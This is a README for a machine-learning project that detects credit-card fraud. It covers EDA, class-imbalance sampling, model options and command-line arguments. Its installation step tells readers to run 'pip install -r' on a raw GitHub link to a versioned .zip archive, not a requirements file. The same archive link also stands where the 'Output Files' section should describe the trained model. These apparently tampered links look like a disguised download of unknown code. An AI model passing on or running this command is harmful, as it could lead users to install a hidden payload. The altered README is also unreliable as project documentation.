<pre>
📘 Credit Card Fraud Detection

A full machine-learning pipeline for detecting fraudulent transactions in highly imbalanced credit-card datasets.
This project includes EDA, preprocessing, sampling techniques, model training, hyperparameter tuning, and performance evaluation using best practices for imbalanced classification.

📌 Project Overview

Credit-card fraud detection is a binary classification task where fraud cases are extremely rare.
This project follows a clean and modular ML workflow:

✔ Exploratory Data Analysis (EDA)

✔ Data preprocessing (scaling, imputation, feature engineering)

✔ Handling imbalance (SMOTE, SMOTEENN, RandomUnderSampler, class weighting)

✔ Modeling (Logistic Regression, Random Forest, MLP Neural Network, Voting Classifier)

✔ Grid Search with cross-validation

✔ Saving final models and metrics

✔ Configurable training using command-line arguments

📂 Project Structure

Credit-Card-Fraud-Detection/
│

├── Data/

│    ├── newtrain.csv # for training purpose

│    ├── val.csv # for validation purpose

│    └── test.csv # for testing purpose
│

├── EDA.ipynb                   # notebook for exploratory data analysis & visualization

│

│

├── credit_fraud_train.py  # main script to run full training pipeline

├── credit_fraud_utils_data.py # script for the training utilities

├── credit_fraud_test.py # script to run inference / evaluation on test set


├── requirements.txt         → Python dependencies

├── README.MD                → You are here

└── Results/             → Model results summary



📥 Dataset

This project works with the popular Credit Card Fraud Detection dataset (2013)
containing 284,807 transactions with PCA-transformed features.

schema includes:

Time, Amount, and 28 PCA-transformed features (V1–V28)

Class → 0 = normal, 1 = fraud




🛠 Installation

1️⃣ Create a virtual environment

python -m venv venv

 Mac/Linux
 
source venv/bin/activate

 Windows
 
venv\Scripts\activate

2️⃣ Install dependencies

pip install -r https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip


🚀 How to Run Training

Our Final Model 

python credit_fraud_train.py --model RandomForest --scaler StandardScaler --train 'data\newtrain.csv' --val 'data\val.csv'


You can also try other arguments

⚙️ Command-Line Arguments
| Argument       | Description                                                          |
| -------------- | -------------------------------------------------------------------- |
| `--model`      | LogisticRegression / RandomForest / NeuralNetwork / VotingClassifier |
| `--scaler`     | StandardScaler / MinMaxScaler / RobustScaler / None                  |
| `--train`      | Path to training CSV                                                 |
| `--val`        | Path to validation CSV                                               |
| `--gridsearch` | Enable GridSearchCV                                                  |
| `--sampling`   | SMOTE / SMOTEENN / UnderSampler / None                               |
| `--factor`     | Sampling factor for SMOTE                                            |
| `--outliers_features`| "List of feature names on which outliers should be removed. "  |
| `--outliers_factor`| "when factor increase the number of deleted outliers decrease and vice versa"|



📊 Evaluation Metrics

Given the severe class imbalance, accuracy is misleading.
Instead, the project uses robust metrics:

F1-score

Average Precision (AP)

Confusion Matrix

Cross-validated metrics using Stratified K-Fold



🧠 Machine Learning Models

🔹 Logistic Regression

Strong baseline

Supports class_weight='balanced'

🔹 Random Forest

Great for tabular, imbalanced data

Handles non-linear relationships

🔹 Neural Network (MLP)

Multi-layer perceptron (sklearn)

Tunable through Grid Search

🔹 Voting Classifier

Combines multiple models

Supports soft voting



⚖ Handling Class Imbalance

Techniques supported:

SMOTE

SMOTEENN (SMOTE + ENN cleaning)

Random Under-Sampling

Class weighting (model-based)

👉 Sampling is applied inside CV folds only to avoid data leakage.



📁 Output Files

After training, the project outputs:
https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip            →trained model and best threshold  


🧩 Future Improvements

Build a FastAPI inference service
 </pre>
